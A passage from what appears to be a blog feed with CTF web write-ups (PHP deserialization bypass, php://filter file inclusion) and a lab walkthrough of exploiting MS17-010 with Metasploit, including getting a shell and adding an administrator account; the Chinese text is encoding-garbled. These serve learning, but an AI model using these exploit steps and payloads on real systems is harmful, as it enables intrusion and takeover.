  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œweb</title>
    <url>/2023/03/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</url>
    <content><![CDATA[<p>  æ”»é˜²ä¸–ç•Œweb</p>
   <span id="more"></span>

<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><code>__wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªç»•è¿‡ç‚¹ã€‚</code></p>
<p>O:7:â€chybetaâ€:1:{s:4:â€testâ€;s:3:â€123â€;}</p>
<p>è¿™é‡Œçš„Oå‘¢å°±æ˜¯objectå¯¹è±¡çš„æ„æ€</p>
<p>æ•°å­—7ä»£è¡¨ç€å¯¹è±¡çš„å‡½æ•°åæœ‰7ä¸ªå ä½</p>
<p>ç„¶åå°±æ˜¯å¯¹è±¡åäº†</p>
<p>è¿™ä¸ªæ•°å­—1è¡¨ç¤ºå¯¹è±¡é‡Œæœ‰ä¸€ä¸ªå˜é‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>

<p><code>__wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªç»•è¿‡ç‚¹ã€‚</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xctf&#123;</span><br><span class="line">public $flag = &#x27;111&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#x27;bad requests&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = new xctf();</span><br><span class="line">print(serialize($c));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>run ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>æ›´æ”¹å±æ€§è·³è¿‡__wake</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>cyberpeace{80472bc9cb95f5a442c6b980d0a2f2ed}</p>
<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p><code>@</code>æ˜¯å¯ä»¥å±è”½å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜è€Œäº§ç”Ÿçš„ä¸€äº›é”™è¯¯ã€è­¦å‘Šä¿¡æ¯ï¼Œè¿™æ ·ç”¨æˆ·å°±çœ‹ä¸åˆ°ç¨‹åºçš„å‡ºé”™ä¿¡æ¯ã€‚è¿™æ ·é™¤äº†ç”¨æˆ·ç•Œé¢ä¼šå‹å¥½ä¸€äº›å¤–ï¼Œæ›´é‡è¦çš„æ˜¯å®‰å…¨æ€§ï¼Œå› ä¸ºå±è”½äº†å‡ºé”™æ–‡ä»¶çš„è·¯å¾„ç­‰ä¿¡æ¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//\dåŒ¹é…æ•°å­—ï¼Œoc:+4ç»•è¿‡</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$c</span>); <span class="comment">//åå¤æµ‹è¯•ä¸èƒ½æ‰‹åŠ¨æ”¹ï¼Œç”±äºååºåˆ—åŒ–åå‡ºç°ä¹±ç ï¼Œå¤åˆ¶ä¹‹åä¼šæ”¹å˜å¯¼è‡´åºåˆ—åŒ–ç»“æœä¸ä¸€æ ·ï¼Œåªèƒ½ç”±str_replaceæ›¿æ¢ï¼Œå¦åˆ™base64ç¼–ç ä¸ä¸€æ ·ã€‚æ— æ³•çˆ†å‡ºç»“æœã€‚æ‰¾äº†20åˆ†é’Ÿçš„åŸå› ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>));</span><br></pre></td></tr></table></figure>

<p>ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}</p>
<h3 id="fileclude"><a href="#fileclude" class="headerlink" title="fileclude"></a>fileclude</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&quot;file1&quot;]) &amp;&amp; isset($_GET[&quot;file2&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $file1 = $_GET[&quot;file1&quot;];</span><br><span class="line">    $file2 = $_GET[&quot;file2&quot;];</span><br><span class="line">    if(!empty($file1) &amp;&amp; !empty($file2))</span><br><span class="line">    &#123;</span><br><span class="line">        if(file_get_contents($file2) === &quot;hello ctf&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            include($file1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;NONONO&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63403/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶hackbarä¼ å‚hello ctf</p>
<p>cyberpeace{e0487d7ed7e17a96dea9922a9a1d19a2}</p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...å†æƒ³æƒ³&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/m0_51683653/article/details/128839648">https://blog.csdn.net/m0_51683653/article/details/128839648</a></p>
<p>cyberpeace{e8b0e794a7cc1f5d75bae6b3868d77db}</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);   <span class="comment">//å­—ç¬¦ä¸²åè½¬</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>; <span class="comment">//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);<span class="comment">//chr() å‡½æ•°ä»æŒ‡å®š ASCII å€¼è¿”å›å­—ç¬¦ã€‚å¹¶å¯ä»¥æŒ‡å®šASCIIæ˜¯åè¿›åˆ¶æˆ–æ˜¯åå…­è¿›åˆ¶æˆ–æ˜¯å…«è¿›åˆ¶ã€‚</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// â€œ.â€ æ˜¯å­—ç¬¦è¿ç®—ç¬¦ï¼Œä½œç”¨æ˜¯æŠŠä¸¤ä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ï¼Œ</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*str_rot13() å‡½æ•°å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚</span></span><br><span class="line"><span class="comment">ROT13 ç¼–ç æ˜¯æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯å¾—åˆ°ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>â€‹      substr()</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>å¿…éœ€ã€‚è§„å®šè¦è¿”å›å…¶ä¸­ä¸€éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚</th>
</tr>
</thead>
<tbody><tr>
<td><em>start</em></td>
<td>å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æŒ‡å®šä½ç½®å¼€å§‹0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹</td>
</tr>
<tr>
<td><em>length</em></td>
<td>å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚æ­£æ•° - ä» <em>start</em> å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›çš„é•¿åº¦è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›çš„é•¿åº¦</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o=NULL;</span><br><span class="line">for($_0=0;$_0&lt;strlen($_);$_0++)&#123;    </span><br><span class="line">        $_c=substr($_,$_0,1);  </span><br><span class="line">        $__=ord($_c)-1;  </span><br><span class="line">        $_c=chr($__);  </span><br><span class="line">        $_o=$_o.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">echo strrev($_o);//å…ˆåè½¬ï¼Œæ‰€ä»¥è§£å¯†æœ€ååè½¬</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p>
]]></content>
      <categories>
        <category>æ”»é˜²ä¸–ç•Œ</category>
      </categories>
      <tags>
        <tag>æ”»é˜²ä¸–ç•Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ°¸æ’ä¹‹è“æ¼æ´å¤ç°</title>
    <url>/2023/04/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>  å­¦ä¹ ä¸€ä¸‹msf</p>
<p>â€‹    <span id="more"></span></p>
<p>windos7é•œåƒä¸‹è½½</p>
<p><a href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISOé•œåƒä¸‹è½½ - æˆ‘çš„MSDN (imsdn.cn)</a></p>
<p>1.å¯åŠ¨msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>2.æœç´¢å¯ä»¥ç”¨çš„æ¨¡æ¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3   #ä½¿ç”¨auxiliary/scanner/smb/smb_ms17_010  è¿›è¡Œæ‰«ææ˜¯å¦å­˜åœ¨MS17-010æ¼æ´</span><br><span class="line">show options   #æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/QQ%E6%88%AA%E5%9B%BE20230412145641.png"></p>
<p><img src="/2023/04/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/QQ%E6%88%AA%E5%9B%BE20230412145859.png"></p>
<p>è‹¥å­˜åœ¨å¦‚ä¸Šå›¾æ‰€ç¤º</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblueæ˜¯æ°¸æ’ä¹‹è“æ”»å‡»ä»£ç </span><br><span class="line">show options   #æŸ¥çœ‹éœ€è¦è®¾ç½®çš„å‚æ•°</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»å®Œæˆ</p>
<p>5.æ˜¾ç¤º   win  å­—æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell    #è¿›å…¥å‘½ä»¤è¡Œ</span><br><span class="line">chcp 65001    ##åˆ‡æ¢ç¼–ç ï¼Œè§£å†³ä¹±ç é—®é¢˜</span><br><span class="line">exit   #ç¦»å¼€shell</span><br><span class="line">background #æŠŠæˆ‘ä»¬è·å¾—çš„meterpreterä¼šè¯æŒ‚è½½åˆ°åå°è¿è¡Œ</span><br><span class="line">sessions   #æ˜¾ç¤ºæ‰€æœ‰ä¼šè¯</span><br><span class="line">sessions id   #è¿›å…¥ä¼šè¯</span><br></pre></td></tr></table></figure>



<ol start="6">
<li></li>
</ol>
<p>1ã€åˆ›å»ºæ–°ç”¨æˆ· ï¼Œè¯­æ³•ï¼šnet user ç”¨æˆ·å å¯†ç  &#x2F;add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #å°†ç”¨æˆ·sssæ·»åŠ è‡³ç®¡ç†å‘˜ç»„</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">æ ¸å¿ƒå‘½ä»¤ï¼š</span><br><span class="line">==========================================</span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             å¸®åŠ©èœå•</span><br><span class="line">background                    æŠŠå½“å‰ä¼šè¯æŒ‚åˆ°åå°è¿è¡Œ</span><br><span class="line">bg                            backgroundå‘½ä»¤çš„åˆ«å</span><br><span class="line">bgkill                        æ€æ­»åå°meterpreter è„šæœ¬</span><br><span class="line">bglist                        åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬</span><br><span class="line">bgrun                         æ‰§è¡Œä¸€ä¸ªmeterpreterè„šæœ¬ä½œä¸ºåå°çº¿ç¨‹</span><br><span class="line">channel                       æ˜¾ç¤ºä¿¡æ¯æˆ–æ§åˆ¶æ´»åŠ¨é¢‘é“</span><br><span class="line">close                         å…³é—­ä¸€ä¸ªé¢‘é“</span><br><span class="line">detach                        åˆ†ç¦»Meterpreterä¼šè¯ï¼ˆç”¨äº http/httpsï¼‰</span><br><span class="line">disable_unicode_encoding      ç¦ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç </span><br><span class="line">enable_unicode_encoding       å¯ç”¨ unicode å­—ç¬¦ä¸²çš„ç¼–ç </span><br><span class="line">exit                          ç»ˆæ­¢ Meterpreter ä¼šè¯</span><br><span class="line">get_timeouts                  è·å–å½“å‰ä¼šè¯è¶…æ—¶å€¼</span><br><span class="line">guid                          è·å–ä¼šè¯ GUID</span><br><span class="line">help                          å¸®åŠ©èœå•</span><br><span class="line">info                          æ˜¾ç¤ºæœ‰å…³ Post æ¨¡å—çš„ä¿¡æ¯</span><br><span class="line">irb                           åœ¨å½“å‰ä¼šè¯ä¸­æ‰“å¼€ä¸€ä¸ªäº¤äº’å¼ Ruby shell</span><br><span class="line">load                          åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ª Meterpreter æ‰©å±•</span><br><span class="line">machine_id                    è·å–è¿æ¥åˆ°ä¼šè¯çš„æœºå™¨çš„ MSF ID</span><br><span class="line">migrate                       å°†æœåŠ¡å™¨è¿ç§»åˆ°å¦ä¸€ä¸ªè¿›ç¨‹</span><br><span class="line">pivot                         ç®¡ç†æ¢è½´ä¾¦å¬å™¨</span><br><span class="line">pry                           åœ¨å½“å‰ä¼šè¯ä¸Šæ‰“å¼€ Pry è°ƒè¯•å™¨</span><br><span class="line">quit                          ç»ˆæ­¢ Meterpreter ä¼šè¯</span><br><span class="line">read                          ä»é€šé“è¯»å–æ•°æ®</span><br><span class="line">resource                      è¿è¡Œå­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤</span><br><span class="line">run                           æ‰§è¡Œä¸€ä¸ª Meterpreter è„šæœ¬æˆ– Post æ¨¡å—</span><br><span class="line">secure                       ï¼ˆé‡æ–°ï¼‰åå•†ä¼šè¯ä¸Šçš„ TLV æ•°æ®åŒ…åŠ å¯†</span><br><span class="line">sessions                      å¿«é€Ÿåˆ‡æ¢åˆ°å¦ä¸€ä¸ªä¼šè¯</span><br><span class="line">set_timeouts                  è®¾ç½®å½“å‰ä¼šè¯è¶…æ—¶å€¼</span><br><span class="line">sleep                         å¼ºåˆ¶ Meterpreter å®‰é™ï¼Œç„¶åé‡æ–°å»ºç«‹ä¼šè¯</span><br><span class="line">ssl_verify                    ä¿®æ”¹ SSL è¯ä¹¦éªŒè¯è®¾ç½®</span><br><span class="line">transport                     ç®¡ç†è¿è¾“æœºåˆ¶</span><br><span class="line">use                           ä¸æ¨èä½¿ç”¨çš„loadå‘½ä»¤åˆ«å</span><br><span class="line">uuid                          è·å–å½“å‰ä¼šè¯çš„ UUID</span><br><span class="line">write                         å°†æ•°æ®å†™å…¥é€šé“</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapiï¼šæ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">å‘½ä»¤                           è¯´æ˜</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           å°†æ–‡ä»¶å†…å®¹è¯»åˆ°å±å¹•ä¸Š</span><br><span class="line">cd                            åˆ‡æ¢ç›®å½•</span><br><span class="line">checksum                      æ£€ç´¢æ–‡ä»¶çš„æ ¡éªŒå’Œ</span><br><span 